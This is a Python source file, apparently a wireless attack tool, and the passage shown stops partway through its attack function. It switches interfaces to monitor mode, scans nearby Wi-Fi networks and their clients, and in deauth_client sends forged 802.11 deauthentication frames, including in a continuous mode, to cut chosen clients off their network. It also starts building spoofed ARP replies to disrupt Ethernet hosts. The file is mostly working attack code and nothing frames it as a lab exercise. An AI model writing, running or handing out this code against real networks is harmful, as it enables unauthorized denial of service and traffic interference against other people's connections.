#!/usr/bin/env python3

import os
import sys
import time
import subprocess
import threading
import signal
from datetime import datetime
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Elt, Dot11Beacon
from scapy.layers.l2 import Ether, ARP
import argparse
import json
import re
from typing import List, Dict, Optional, Tuple, Set
import csv
import netifaces
import atexit
import psutil
from collections import defaultdict

# Global variables
selected_interfaces = {"wlan": None, "eth": None}
selected_network = None
selected_client = None
scan_results = []
clients_list = []
running = True
log_file = "wifi_deauth_log.csv"
attack_threads = []
interface_tracker = {}  # Track interface changes and original states
original_interface_state = {}  # Store original interface states for restoration

class InterfaceTracker:
    """Track interface state changes and manage restoration"""
    
    def __init__(self):
        self.interface_map = {}  # original -> current mapping
        self.original_states = {}  # original interface states
        self.created_monitors = []  # monitor interfaces we created
        self.processes_to_kill = []  # processes we started
        
    def add_interface(self, original_iface: str, current_iface: str, 
                     original_mode: str = "managed"):
        """Track an interface change"""
        self.interface_map[original_iface] = current_iface
        self.original_states[original_iface] = {
            'mode': original_mode,
            'channel': self._get_interface_channel(original_iface),
            'essid': self._get_interface_essid(original_iface)
        }
        
        # If we created a monitor interface, track it
        if current_iface != original_iface and ('mon' in current_iface or current_iface.endswith('mon')):
            if current_iface not in self.created_monitors:
                self.created_monitors.append(current_iface)
    
    def get_current_interface(self, original_iface: str) -> Optional[str]:
        """Get current interface name for an original interface"""
        return self.interface_map.get(original_iface, original_iface)
    
    def get_original_interface(self, current_iface: str) -> Optional[str]:
        """Get original interface name for a current interface"""
        for orig, curr in self.interface_map.items():
            if curr == current_iface:
                return orig
        return None
    
    def add_process(self, pid: int):
        """Track a process we started"""
        if pid and pid not in self.processes_to_kill:
            self.processes_to_kill.append(pid)
    
    def _get_interface_channel(self, interface: str) -> str:
        """Get interface channel"""
        try:
            result = subprocess.run(['iwconfig', interface], 
                                   capture_output=True, text=True)
            match = re.search(r'Channel (\d+)', result.stdout)
            return match.group(1) if match else "unknown"
        except:
            return "unknown"
    
    def _get_interface_essid(self, interface: str) -> str:
        """Get interface ESSID"""
        try:
            result = subprocess.run(['iwconfig', interface], 
                                   capture_output=True, text=True)
            match = re.search(r'ESSID:"([^"]*)"', result.stdout)
            return match.group(1) if match else ""
        except:
            return ""
    
    def cleanup(self):
        """Cleanup all tracked interfaces and processes"""
        print("\n[Tracker] Cleaning up tracked interfaces and processes...")
        
        # Kill tracked processes
        for pid in self.processes_to_kill:
            try:
                if psutil.pid_exists(pid):
                    p = psutil.Process(pid)
                    p.terminate()
                    print(f"[Tracker] Terminated process {pid} ({p.name()})")
            except:
                pass
        
        # Restore interface states
        for original_iface, state in self.original_states.items():
            try:
                current_iface = self.get_current_interface(original_iface)
                if current_iface != original_iface:
                    # We created a monitor interface
                    print(f"[Tracker] Stopping monitor interface {current_iface}")
                    subprocess.run(['airmon-ng', 'stop', current_iface], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                 timeout=10)
            except:
                pass
        
        self.interface_map.clear()
        self.original_states.clear()
        self.created_monitors.clear()
        self.processes_to_kill.clear()

interface_tracker = InterfaceTracker()

class Logger:
    def __init__(self, log_file: str = "wifi_deauth_log.csv"):
        self.log_file = log_file
        self.ensure_log_file()
    
    def ensure_log_file(self):
        """Create log file with headers if it doesn't exist"""
        if not os.path.exists(self.log_file):
            with open(self.log_file, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['Timestamp', 'Action', 'Interface_Type', 'Interface_Name', 
                               'BSSID', 'ESSID', 'Client_MAC', 'Channel', 
                               'Duration', 'Packets_Sent', 'Status'])
    
    def log(self, action: str, interface_type: str = "", interface_name: str = "", 
            bssid: str = "", essid: str = "", client_mac: str = "", 
            channel: str = "", duration: str = "", packets: str = "", status: str = ""):
        """Log an action to the CSV file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Sanitize fields to prevent CSV injection
        def sanitize_field(field):
            if field and isinstance(field, str):
                field = field.replace('"', "'")
                if field.startswith(('=', '+', '-', '@')):
                    field = "'" + field
            return field
        
        fields = [timestamp, action, interface_type, interface_name, 
                 bssid, essid, client_mac, channel, duration, packets, status]
        sanitized_fields = [sanitize_field(str(field)) for field in fields]
        
        try:
            with open(self.log_file, 'a', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(sanitized_fields)
            
            print(f"[LOG] {timestamp} - {action}: {status}")
        except Exception as e:
            print(f"[LOG ERROR] Failed to write log: {e}")

# Create initial logger instance
logger = Logger(log_file)

def cleanup_handler():
    """Cleanup handler for atexit and signals"""
    print("\n[Cleanup] Performing cleanup...")
    stop_all_attacks()
    interface_tracker.cleanup()
    restore_all_interfaces()

# Register cleanup handlers
atexit.register(cleanup_handler)
signal.signal(signal.SIGINT, lambda sig, frame: (print("\n[Signal] SIGINT received"), cleanup_handler(), sys.exit(0)))
signal.signal(signal.SIGTERM, lambda sig, frame: (print("\n[Signal] SIGTERM received"), cleanup_handler(), sys.exit(0)))

def check_root():
    """Check if script is running as root"""
    if os.geteuid() != 0:
        print("This script requires root privileges!")
        print("Please run with sudo.")
        sys.exit(1)

def check_dependencies():
    """Check if required tools are installed"""
    required_tools = ['iwconfig', 'iw', 'ip', 'airmon-ng', 'airodump-ng']
    missing_tools = []
    
    print("[Check] Verifying dependencies...")
    for tool in required_tools:
        try:
            subprocess.run(['which', tool], stdout=subprocess.DEVNULL, 
                          stderr=subprocess.DEVNULL, check=True)
            print(f"  ✓ {tool}")
        except:
            missing_tools.append(tool)
            print(f"  ✗ {tool} (missing)")
    
    if missing_tools:
        print(f"\n[ERROR] Missing required tools: {', '.join(missing_tools)}")
        print("Please install with: sudo apt install aircrack-ng wireless-tools")
        return False
    
    # Check Python dependencies
    try:
        import scapy
        print("  ✓ scapy")
    except ImportError:
        print("  ✗ scapy (missing)")
        print("Install with: pip install scapy")
        return False
    
    try:
        import netifaces
        print("  ✓ netifaces")
    except ImportError:
        print("  ✗ netifaces (missing)")
        print("Install with: pip install netifaces")
        return False
    
    print("[Check] All dependencies verified.")
    return True

def get_available_interfaces() -> Dict[str, List[str]]:
    """Get all available network interfaces categorized by type"""
    interfaces = {"wlan": [], "eth": [], "monitor": []}
    
    try:
        # Get all interfaces
        all_interfaces = netifaces.interfaces()
        
        for iface in all_interfaces:
            # Skip loopback and virtual interfaces
            if iface.startswith('lo') or iface.startswith('docker') or iface.startswith('veth'):
                continue
            
            # Check if it's wireless
            if os.path.exists(f'/sys/class/net/{iface}/wireless'):
                if check_monitor_mode(iface):
                    interfaces["monitor"].append(iface)
                else:
                    interfaces["wlan"].append(iface)
            # Check if it's ethernet (or likely ethernet)
            elif 'eth' in iface or 'enp' in iface or 'ens' in iface or 'eno' in iface:
                interfaces["eth"].append(iface)
        
        return interfaces
    except Exception as e:
        print(f"[Warning] Error getting interfaces: {e}")
        # Fallback method
        try:
            result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'wlan' in line:
                    match = re.search(r'^\d+: (\w+):', line)
                    if match:
                        iface = match.group(1)
                        if check_monitor_mode(iface):
                            interfaces["monitor"].append(iface)
                        else:
                            interfaces["wlan"].append(iface)
                elif 'eth' in line or 'enp' in line:
                    match = re.search(r'^\d+: (\w+):', line)
                    if match:
                        interfaces["eth"].append(match.group(1))
        except:
            pass
        
        return interfaces

def check_monitor_mode(interface: str) -> bool:
    """Check if interface is in monitor mode"""
    try:
        result = subprocess.run(['iwconfig', interface], capture_output=True, text=True)
        return "Mode:Monitor" in result.stdout.replace(" ", "")
    except:
        return False

def get_monitor_interface_name(base_interface: str) -> Optional[str]:
    """Get the actual monitor interface name after conversion"""
    try:
        # Check if base interface is already in monitor mode
        if check_monitor_mode(base_interface):
            return base_interface
        
        # Check for common monitor interface names
        possible_names = [
            base_interface + 'mon',
            'mon' + base_interface,
            base_interface.replace('wlan', 'wlan') + 'mon'
        ]
        
        for name in possible_names:
            try:
                if os.path.exists(f'/sys/class/net/{name}'):
                    if check_monitor_mode(name):
                        return name
            except:
                pass
        
        # Check all interfaces for monitor mode
        all_interfaces = netifaces.interfaces()
        for iface in all_interfaces:
            if check_monitor_mode(iface):
                # Check if it's related to our base interface
                if base_interface in iface or iface in base_interface:
                    return iface
        
        return None
    except:
        return None

def set_monitor_mode(interface: str) -> Tuple[Optional[str], bool]:
    """Set wireless interface to monitor mode with proper tracking"""
    original_interface = interface
    original_mode = "managed"
    
    try:
        print(f"\n[Monitor] Setting {interface} to monitor mode...")
        
        # Check current mode
        if check_monitor_mode(interface):
            print(f"[Monitor] {interface} is already in monitor mode")
            interface_tracker.add_interface(original_interface, interface, original_mode)
            return interface, True
        
        # Check for existing monitor interface
        existing_monitor = get_monitor_interface_name(interface)
        if existing_monitor and existing_monitor != interface:
            print(f"[Monitor] Found existing monitor interface: {existing_monitor}")
            interface_tracker.add_interface(original_interface, existing_monitor, original_mode)
            return existing_monitor, True
        
        # Track original state
        original_mode = "managed"
        if check_monitor_mode(interface):
            original_mode = "monitor"
        
        # Stop interfering processes
        print("[Monitor] Stopping interfering processes...")
        try:
            kill_proc = subprocess.Popen(['airmon-ng', 'check', 'kill'], 
                                       stdout=subprocess.DEVNULL, 
                                       stderr=subprocess.DEVNULL)
            kill_proc.wait(timeout=15)
            interface_tracker.add_process(kill_proc.pid)
        except Exception as e:
            print(f"[Monitor] Warning: Failed to kill processes: {e}")
        
        # Try airmon-ng
        print("[Monitor] Starting airmon-ng...")
        try:
            # Use timeout to prevent hanging
            result = subprocess.run(['airmon-ng', 'start', interface, '--verbose'], 
                                  capture_output=True, text=True, timeout=20)
            
            print(f"[Monitor] airmon-ng output:\n{result.stdout[:500]}")
            
            # Parse for created monitor interface
            monitor_iface = None
            for line in result.stdout.split('\n'):
                line_lower = line.lower()
                if 'monitor mode enabled on' in line_lower:
                    match = re.search(r'enabled on (\w+)', line_lower)
                    if match:
                        monitor_iface = match.group(1)
                        print(f"[Monitor] Found monitor interface in output: {monitor_iface}")
                        break
            
            # If not found in stdout, check stderr
            if not monitor_iface:
                for line in result.stderr.split('\n'):
                    line_lower = line.lower()
                    if 'monitor mode enabled on' in line_lower:
                        match = re.search(r'enabled on (\w+)', line_lower)
                        if match:
                            monitor_iface = match.group(1)
                            print(f"[Monitor] Found monitor interface in stderr: {monitor_iface}")
                            break
            
            # If still not found, check for common patterns
            if not monitor_iface:
                possible_names = [interface + 'mon', 'mon' + interface]
                for name in possible_names:
                    if os.path.exists(f'/sys/class/net/{name}') and check_monitor_mode(name):
                        monitor_iface = name
                        print(f"[Monitor] Found monitor interface by name pattern: {monitor_iface}")
                        break
            
            if monitor_iface and check_monitor_mode(monitor_iface):
                print(f"[Monitor] Successfully enabled monitor mode on {monitor_iface}")
                interface_tracker.add_interface(original_interface, monitor_iface, original_mode)
                return monitor_iface, True
            else:
                print(f"[Monitor] airmon-ng didn't return valid monitor interface")
                if monitor_iface:
                    print(f"[Monitor] Interface {monitor_iface} exists but not in monitor mode")
                
        except subprocess.TimeoutExpired:
            print("[Monitor] airmon-ng timed out!")
        except Exception as e:
            print(f"[Monitor] airmon-ng failed: {e}")
        
        # Try manual method
        print("[Monitor] Trying manual method...")
        try:
            # Bring interface down
            subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            time.sleep(1)
            
            # Set monitor mode
            result = subprocess.run(['iw', 'dev', interface, 'set', 'type', 'monitor'], 
                                  capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                # Bring interface up
                subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
                time.sleep(2)  # Give more time for interface to come up
                
                if check_monitor_mode(interface):
                    print(f"[Monitor] Manual monitor mode successful on {interface}")
                    interface_tracker.add_interface(original_interface, interface, original_mode)
                    return interface, True
                else:
                    print(f"[Monitor] Manual method completed but interface not in monitor mode")
            else:
                print(f"[Monitor] Manual method failed: {result.stderr}")
                
        except Exception as e:
            print(f"[Monitor] Manual method failed: {e}")
        
        # Final check - maybe monitor mode was enabled but we missed it
        monitor_iface = get_monitor_interface_name(interface)
        if monitor_iface and check_monitor_mode(monitor_iface):
            print(f"[Monitor] Found monitor interface after all attempts: {monitor_iface}")
            interface_tracker.add_interface(original_interface, monitor_iface, original_mode)
            return monitor_iface, True
        
        print("[Monitor] All monitor mode methods failed!")
        return None, False
        
    except Exception as e:
        print(f"[Monitor] Error in set_monitor_mode: {e}")
        import traceback
        traceback.print_exc()
        return None, False

def restore_managed_mode(interface: str) -> bool:
    """Restore interface to managed mode"""
    try:
        print(f"\n[Restore] Restoring {interface} to managed mode...")
        
        # Check if it's already in managed mode
        if not check_monitor_mode(interface):
            print(f"[Restore] {interface} is already in managed mode")
            return True
        
        # Get original interface name
        original_iface = interface_tracker.get_original_interface(interface)
        if not original_iface:
            original_iface = interface.replace('mon', '').replace('Mon', '')
            if original_iface == interface:  # No change
                original_iface = interface
        
        # Try airmon-ng stop
        try:
            print(f"[Restore] Trying airmon-ng stop on {interface}...")
            result = subprocess.run(['airmon-ng', 'stop', interface], 
                                  capture_output=True, text=True, timeout=15)
            
            print(f"[Restore] airmon-ng output:\n{result.stdout[:200]}")
            
            for line in result.stdout.split('\n'):
                if 'managed mode enabled on' in line.lower():
                    match = re.search(r'enabled on (\w+)', line, re.IGNORECASE)
                    if match:
                        restored_iface = match.group(1)
                        print(f"[Restore] Managed mode restored on {restored_iface}")
                        return True
        except Exception as e:
            print(f"[Restore] airmon-ng stop failed: {e}")
        
        # Manual method
        try:
            print(f"[Restore] Trying manual method on {interface}...")
            
            # Bring interface down
            subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            time.sleep(1)
            
            # Set managed mode
            result = subprocess.run(['iwconfig', interface, 'mode', 'managed'], 
                                  capture_output=True, text=True, timeout=5)
            
            if result.returncode != 0:
                # Try alternative method
                subprocess.run(['iw', 'dev', interface, 'set', 'type', 'managed'], 
                              capture_output=True, text=True, timeout=5)
            
            # Bring interface up
            subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            time.sleep(2)
            
            # Check if in managed mode
            if not check_monitor_mode(interface):
                print(f"[Restore] Manual managed mode successful on {interface}")
                
                # Try to restart NetworkManager
                try:
                    subprocess.run(['systemctl', 'restart', 'NetworkManager'], 
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                  timeout=10)
                    print("[Restore] NetworkManager restarted")
                except:
                    print("[Restore] Could not restart NetworkManager")
                
                return True
            else:
                print(f"[Restore] Interface still in monitor mode after manual restore")
                
        except Exception as e:
            print(f"[Restore] Manual restore failed: {e}")
        
        # Last resort: kill airmon-ng processes
        try:
            print("[Restore] Killing airmon-ng processes...")
            subprocess.run(['pkill', '-f', 'airmon-ng'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)
        except:
            pass
        
        return False
        
    except Exception as e:
        print(f"[Restore] Error restoring managed mode: {e}")
        import traceback
        traceback.print_exc()
        return False

def restore_all_interfaces():
    """Restore all interfaces to normal state"""
    print("\n[Restore] Restoring all interfaces to normal state...")
    
    # Restore tracked interfaces first
    interface_tracker.cleanup()
    
    # Get all interfaces
    try:
        all_interfaces = netifaces.interfaces()
        
        # Identify and stop monitor interfaces
        monitor_interfaces = []
        for iface in all_interfaces:
            if iface.startswith('lo'):
                continue
            
            if check_monitor_mode(iface):
                monitor_interfaces.append(iface)
                print(f"[Restore] Found monitor interface: {iface}")
        
        # Stop monitor interfaces
        for iface in monitor_interfaces:
            print(f"[Restore] Stopping monitor interface: {iface}")
            try:
                subprocess.run(['airmon-ng', 'stop', iface], 
                              stdout=subprocess.DEVNULL, 
                              stderr=subprocess.DEVNULL,
                              timeout=10)
            except Exception as e:
                print(f"[Restore] Error stopping {iface}: {e}")
        
        # Restart network services
        print("[Restore] Restarting network services...")
        try:
            subprocess.run(['systemctl', 'restart', 'NetworkManager', 'wpa_supplicant'], 
                          stdout=subprocess.DEVNULL,
                          stderr=subprocess.DEVNULL,
                          timeout=15)
            print("[Restore] Network services restarted")
        except Exception as e:
            print(f"[Restore] Could not restart network services: {e}")
        
        # Wait for interfaces to come back
        print("[Restore] Waiting for interfaces to stabilize...")
        time.sleep(3)
        
        # Check interface states
        print("\n[Restore] Final interface check:")
        for iface in all_interfaces:
            if iface.startswith('lo'):
                continue
            
            try:
                if check_monitor_mode(iface):
                    print(f"  ✗ {iface}: Still in monitor mode")
                else:
                    print(f"  ✓ {iface}: In managed mode")
            except:
                print(f"  ? {iface}: Could not determine mode")
        
        print("\n[Restore] Restoration complete. You may need to reconnect to Wi-Fi.")
        
    except Exception as e:
        print(f"[Restore] Error during interface restoration: {e}")
        import traceback
        traceback.print_exc()

def simple_wifi_scan(interface: str) -> List[Dict]:
    """Simple WiFi scan using scapy"""
    print(f"\n[Scan] Scanning for WiFi networks on {interface}...")
    networks = []
    seen_bssids = set()
    
    def handle_packet(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            if bssid in seen_bssids:
                return
            seen_bssids.add(bssid)
            
            # Get ESSID
            essid = "<hidden>"
            if pkt.haslayer(Dot11Elt):
                elt = pkt[Dot11Elt]
                while isinstance(elt, Dot11Elt):
                    if elt.ID == 0 and elt.info:
                        try:
                            essid = elt.info.decode('utf-8', errors='ignore')
                        except:
                            essid = "<hidden>"
                        break
                    elt = elt.payload
            
            # Get channel
            channel = "Unknown"
            if pkt.haslayer(Dot11Elt):
                elt = pkt[Dot11Elt]
                while isinstance(elt, Dot11Elt):
                    if elt.ID == 3 and elt.info:
                        channel = str(ord(elt.info[0:1]))
                        break
                    elt = elt.payload
            
            # Get signal strength
            signal = "N/A"
            if pkt.haslayer(RadioTap):
                radio = pkt[RadioTap]
                if hasattr(radio, 'dBm_AntSignal'):
                    signal = f"{radio.dBm_AntSignal} dBm"
            
            networks.append({
                'BSSID': bssid,
                'ESSID': essid,
                'Channel': channel,
                'Signal': signal,
                'Interface': interface
            })
    
    try:
        print("[Scan] Starting scan (10 seconds)...")
        # Channel hop during scan
        channels = [1, 6, 11, 36, 40, 44, 48, 149, 153, 157, 161, 165]
        stop_sniff = threading.Event()
        
        def sniff_thread():
            sniff(iface=interface, prn=handle_packet, store=0, 
                  stop_filter=lambda x: stop_sniff.is_set())
        
        sniffer = threading.Thread(target=sniff_thread)
        sniffer.daemon = True
        sniffer.start()
        
        # Hop channels
        for i, channel in enumerate(channels):
            if stop_sniff.is_set():
                break
            try:
                subprocess.run(['iwconfig', interface, 'channel', str(channel)], 
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
                print(f"  [Scan] Scanning channel {channel}...")
                time.sleep(0.8)
            except:
                pass
        
        time.sleep(2)
        stop_sniff.set()
        sniffer.join(timeout=2)
        
    except Exception as e:
        print(f"[Scan] Error: {e}")
    
    return networks

def enhanced_wifi_scan(interface: str) -> List[Dict]:
    """Enhanced WiFi scan with multiple methods"""
    networks = []
    
    # Verify interface is in monitor mode
    if not check_monitor_mode(interface):
        print(f"[Scan] Warning: {interface} is not in monitor mode. Scan may fail.")
    
    # Method 1: Try airodump-ng with better process management
    print("\n[Scan] Trying airodump-ng scan...")
    try:
        # Create temp file with unique name
        temp_file = f"/tmp/scan_{int(time.time())}_{os.getpid()}"
        cmd = ['airodump-ng', '--output-format', 'csv', '-w', temp_file, interface]
        
        print(f"[Scan] Starting airodump-ng with command: {' '.join(cmd)}")
        
        # Start process
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                               stdin=subprocess.PIPE, preexec_fn=os.setsid)
        
        # Track process
        interface_tracker.add_process(proc.pid)
        
        # Let it run for 8 seconds
        print("[Scan] Scanning", end="", flush=True)
        for i in range(8):
            print(".", end="", flush=True)
            time.sleep(1)
            if proc.poll() is not None:
                print(f"\n[Scan] airodump-ng exited early with code {proc.returncode}")
                break
        
        # Kill it
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGINT)
            time.sleep(1)
            if proc.poll() is None:
                proc.terminate()
                proc.wait(timeout=2)
            print("\n[Scan] airodump-ng stopped")
        except Exception as kill_error:
            print(f"\n[Scan] Error stopping airodump-ng: {kill_error}")
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except:
                pass
        
        # Read results
        csv_file = f"{temp_file}-01.csv"
        if os.path.exists(csv_file):
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Parse CSV
            lines = content.split('\n')
            in_networks = False
            
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                
                if line.startswith('BSSID,'):
                    in_networks = True
                    continue
                
                if in_networks and line.startswith('Station MAC,'):
                    break
                
                if in_networks:
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 14:
                        bssid = parts[0]
                        channel = parts[3]
                        essid = parts[13] if len(parts) > 13 else ""
                        
                        if bssid and bssid != "BSSID" and len(bssid) == 17:
                            networks.append({
                                'BSSID': bssid,
                                'ESSID': essid if essid else '<hidden>',
                                'Channel': channel if channel else 'Unknown',
                                'Interface': interface
                            })
            
            print(f"[Scan] airodump-ng found {len(networks)} networks")
            
            # Cleanup
            for ext in ['-01.csv', '-01.kismet.csv', '-01.cap', '-01.csv', '.csv', '.cap', '.kismet.csv']:
                for fname in [temp_file + ext, temp_file.replace('/tmp/scan_', '/tmp/') + ext]:
                    if os.path.exists(fname):
                        try:
                            os.remove(fname)
                        except:
                            pass
            
            if networks:
                return networks
        else:
            print(f"[Scan] No CSV file found at {csv_file}")
            
    except Exception as e:
        print(f"\n[Scan] airodump-ng failed: {e}")
        # Don't print traceback here to keep output clean
    
    # Method 2: Simple scapy scan
    print("\n[Scan] Falling back to scapy scan...")
    networks = simple_wifi_scan(interface)
    print(f"[Scan] Scapy found {len(networks)} networks")
    
    return networks

def scan_clients_with_scapy(interface: str, bssid: str, channel: str) -> List[Dict]:
    """Alternative client scanning using scapy"""
    clients = []
    seen_macs = set()
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11):
            # Check if packet is from a client to the AP
            if pkt.addr1 == bssid or pkt.addr2 == bssid:
                client_mac = None
                
                # Determine client MAC
                if pkt.addr1 == bssid:
                    client_mac = pkt.addr2
                elif pkt.addr2 == bssid:
                    client_mac = pkt.addr1
                
                if client_mac and client_mac != bssid and client_mac not in seen_macs:
                    seen_macs.add(client_mac)
                    clients.append({
                        'MAC': client_mac,
                        'BSSID': bssid,
                        'Interface': interface,
                        'Type': 'Wi-Fi'
                    })
    
    try:
        print("[Scan] Scanning with scapy (5 seconds)...")
        subprocess.run(['iwconfig', interface, 'channel', channel], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Sniff for client packets
        sniff(iface=interface, prn=packet_handler, timeout=5, store=0)
        
        print(f"[Scan] Scapy found {len(clients)} clients")
        
    except Exception as e:
        print(f"[Scan] Error: {e}")
    
    return clients

def select_network(interface: str, bssid: str, channel: str) -> List[Dict]:
    """Scan for clients on a specific network"""
    print(f"[Scan] Scanning for clients on {bssid} (channel {channel})...")
    
    clients = []
    
    # First check if interface is in monitor mode
    if not check_monitor_mode(interface):
        print(f"[Scan] Error: {interface} is not in monitor mode!")
        print("[Scan] Client scanning requires monitor mode.")
        return clients
    
    try:
        # Set channel
        subprocess.run(['iwconfig', interface, 'channel', channel], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)  # Give time for channel change
        
        # Method 1: Try airodump-ng
        try:
            temp_file = f"/tmp/client_{int(time.time())}"
            cmd = ['airodump-ng', '--bssid', bssid, '--channel', channel,
                   '--output-format', 'csv', '-w', temp_file, interface]
            
            print("[Scan] Using airodump-ng to scan for clients...")
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   preexec_fn=os.setsid)
            
            interface_tracker.add_process(proc.pid)
            
            # Let it run for 6 seconds
            for i in range(6):
                print(".", end="", flush=True)
                time.sleep(1)
            
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGINT)
                time.sleep(1)
                if proc.poll() is None:
                    proc.terminate()
                    proc.wait(timeout=2)
            except:
                proc.terminate()
                proc.wait(timeout=2)
            
            # Read results
            csv_file = f"{temp_file}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
                
                client_section = False
                for line in lines:
                    line = line.strip()
                    if line.startswith('Station MAC,'):
                        client_section = True
                        continue
                    
                    if client_section and line:
                        parts = line.split(',')
                        if parts and len(parts[0]) == 17:  # MAC address length
                            clients.append({
                                'MAC': parts[0].strip(),
                                'BSSID': bssid,
                                'Interface': interface,
                                'Type': 'Wi-Fi'
                            })
                
                # Cleanup
                for ext in ['-01.csv', '-01.kismet.csv', '-01.cap']:
                    fname = temp_file + ext
                    if os.path.exists(fname):
                        try:
                            os.remove(fname)
                        except:
                            pass
            
            print(f"\n[Scan] Found {len(clients)} clients using airodump-ng")
            
        except Exception as e:
            print(f"\n[Scan] airodump-ng failed: {e}")
            print("[Scan] Falling back to scapy scan...")
            
            # Method 2: Scapy-based client detection
            clients = scan_clients_with_scapy(interface, bssid, channel)
        
    except Exception as e:
        print(f"\n[Scan] Error: {e}")
    
    return clients

def scan_arp_network(interface: str) -> List[Dict]:
    """Scan local network for devices using ARP"""
    print(f"[Scan] Scanning local network on {interface}...")
    
    devices = []
    
    try:
        # Get local IP and network
        addrs = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addrs:
            local_ip = addrs[netifaces.AF_INET][0]['addr']
            netmask = addrs[netifaces.AF_INET][0]['netmask']
            
            # Calculate network range
            ip_parts = list(map(int, local_ip.split('.')))
            mask_parts = list(map(int, netmask.split('.')))
            
            network_parts = []
            for i in range(4):
                network_parts.append(ip_parts[i] & mask_parts[i])
            
            network_ip = '.'.join(map(str, network_parts))
            
            print(f"[Scan] Scanning network: {network_ip}/24")
            
            # Create ARP request
            arp = ARP(pdst=f"{network_ip}/24")
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            
            # Send and receive
            result = srp(packet, timeout=3, iface=interface, verbose=0)[0]
            
            for sent, received in result:
                devices.append({
                    'MAC': received.hwsrc,
                    'IP': received.psrc,
                    'Type': 'Ethernet',
                    'Interface': interface
                })
                
    except Exception as e:
        print(f"[Scan] Error: {e}")
    
    return devices

def deauth_client(interface: str, interface_type: str, bssid: str, 
                  client_mac: str, count: int = 0, duration: int = 0, 
                  thread_id: str = None) -> threading.Thread:
    """Deauthenticate a specific client with thread-specific control"""
    if not thread_id:
        thread_id = f"deauth_{int(time.time())}_{client_mac[:8]}"
    
    stop_flag = threading.Event()
    
    def deauth_thread():
        nonlocal interface, interface_type, bssid, client_mac, thread_id
        
        packets_sent = 0
        start_time = time.time()
        
        try:
            if interface_type == "wlan":
                # Wi-Fi deauth packets
                packet1 = RadioTap() / \
                         Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / \
                         Dot11Deauth(reason=7)
                
                packet2 = RadioTap() / \
                         Dot11(addr1=bssid, addr2=client_mac, addr3=bssid) / \
                         Dot11Deauth(reason=7)
                
                print(f"[Attack:{thread_id}] Starting deauth attack on {client_mac}")
                
                if duration > 0:
                    while (time.time() - start_time) < duration and not stop_flag.is_set():
                        try:
                            sendp(packet1, iface=interface, count=1, verbose=0)
                            sendp(packet2, iface=interface, count=1, verbose=0)
                            packets_sent += 2
                            time.sleep(0.1)
                        except Exception as e:
                            print(f"[Attack:{thread_id}] Send error: {e}")
                            time.sleep(0.5)
                    
                    print(f"[Attack:{thread_id}] Duration complete. Packets sent: {packets_sent}")
                    
                elif count > 0:
                    for i in range(0, count, 2):
                        if stop_flag.is_set():
                            break
                        try:
                            sendp(packet1, iface=interface, count=1, verbose=0)
                            sendp(packet2, iface=interface, count=1, verbose=0)
                            packets_sent += 2
                            if i % 20 == 0:  # Print progress every 20 packets
                                print(f"[Attack:{thread_id}] Sent {i+2}/{count} packets")
                            time.sleep(0.1)
                        except Exception as e:
                            print(f"[Attack:{thread_id}] Send error: {e}")
                            time.sleep(0.5)
                    
                    print(f"[Attack:{thread_id}] Count complete. Packets sent: {packets_sent}")
                    
                else:
                    # Continuous mode
                    print(f"[Attack:{thread_id}] Continuous mode started")
                    while not stop_flag.is_set():
                        try:
                            sendp(packet1, iface=interface, count=1, verbose=0)
                            sendp(packet2, iface=interface, count=1, verbose=0)
                            packets_sent += 2
                            if packets_sent % 100 == 0:
                                print(f"[Attack:{thread_id}] Sent {packets_sent} packets")
                            time.sleep(0.1)
                        except Exception as e:
                            print(f"[Attack:{thread_id}] Send error: {e}")
                            time.sleep(0.5)
                
                status_msg = f"Completed - {packets_sent} packets"
                
            elif interface_type == "eth":
                # Ethernet ARP disruption
                try:
                    # Get network info for realistic ARP spoofing
                    addrs = netifaces.ifaddresses(interface)
                    if netifaces.AF_INET in addrs:
                        local_ip = addrs[netifaces.AF_INET][0]['addr']
                        network_parts = local_ip.split('.')[:3]
                        gateway = '.'.join(network_parts + ['1'])
                        
                        # Create fake ARP packets
                        arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                                    ARP(op=2, pdst=gateway, hwdst="ff:ff:ff:ff:ff:ff",
                                        psrc="192.168.1.100", hwsrc=client_mac)
                        
                        print(f"[Attack:{thread_id}] Starting ARP disruption on {client_mac}")
                        
                        if duration > 0:
